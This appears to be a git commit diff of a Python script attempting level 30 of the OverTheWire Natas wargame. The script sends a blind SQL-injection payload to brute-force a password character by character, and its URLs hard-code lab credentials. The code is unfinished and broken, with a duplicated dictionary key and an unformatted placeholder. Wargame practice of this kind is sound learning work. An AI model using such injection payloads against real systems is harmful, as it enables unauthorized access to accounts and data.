ed3c961d937a06eea6f96d861d1fe1ffb2906970
Ludisposed <pjgvanschaik@gmail.com>
2017-12-18 16:05:51 +0100

    natas30

--- Natas/natas30.py
+++ Natas/natas30.py
@@ -1,13 +1,27 @@
 import requests
 import re
-from urllib.parse import quote, unquote
+import string
 
+
+CHAR_SET = string.ascii_letters + string.digits
+PASSWORD_LENGHT = 32
 session = requests.Session()
 
-def natas29(url):
-    response = session.get(f"{url}index.pl?")
-    print(response.text)       
+def natas30(url):
+    for char in CHAR_SET:
+        # I think it needs to be done like this,
+        # see https://stackoverflow.com/questions/40273267/is-perl-function-dbh-quote-still-secure
+        # But unsure how to proceed after this
+        
+        params={"username": 'natas30" and password like binary "{char}%', "username": 30, "password": "x"}
+        response = session.post(url, data=params)
+        print(response.url)
+        if 'fail' in response.text:
+            print("FAILED")
+        else:
+            print(char)
+            print("SUCCES")
 
 if __name__ == '__main__':
-    url = 'http://natas29:airooCaiseiyee8he8xongien9euhe8b@natas29.natas.labs.overthewire.org/'
-    print(natas29(url))
+    url = 'http://natas30:wie9iexae0Daihohv8vuu3cei9wahf0e@natas30.natas.labs.overthewire.org/'
+    natas30(url)
